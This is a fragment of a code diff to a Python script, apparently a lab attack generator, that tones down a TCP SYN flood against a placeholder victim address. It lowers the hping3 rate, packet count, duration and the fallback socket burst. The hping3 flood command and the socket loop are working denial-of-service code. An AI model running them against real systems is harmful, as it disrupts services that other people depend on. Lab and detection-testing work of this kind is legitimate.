@@ -58,10 +58,10 @@ def execute_port_scan():
             s.close()
 
 
-def execute_dos_syn_flood(duration_seconds: int = 5):
+def execute_dos_syn_flood(duration_seconds: int = 2):
     """Executes high-rate TCP SYN flood burst against victim web port."""
     print(f"\n[ATTACK: DoS SYN FLOOD] Launching volumetric SYN flood on {VICTIM_IP}:80 for {duration_seconds}s...")
-    cmd = ["hping3", "-S", "-p", "80", "--flood", "--count", "5000", VICTIM_IP]
+    cmd = ["hping3", "-S", "-p", "80", "-i", "u20000", "--count", "100", VICTIM_IP]
     try:
         subprocess.run(cmd, timeout=duration_seconds, capture_output=True)
     except subprocess.TimeoutExpired:
@@ -69,7 +69,7 @@ def execute_dos_syn_flood(duration_seconds: int = 5):
     except Exception as e:
         print(f"[!] hping3 not available, fallback to socket burst: {e}")
         import socket
-        for _ in range(500):
+        for _ in range(50):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setblocking(False)
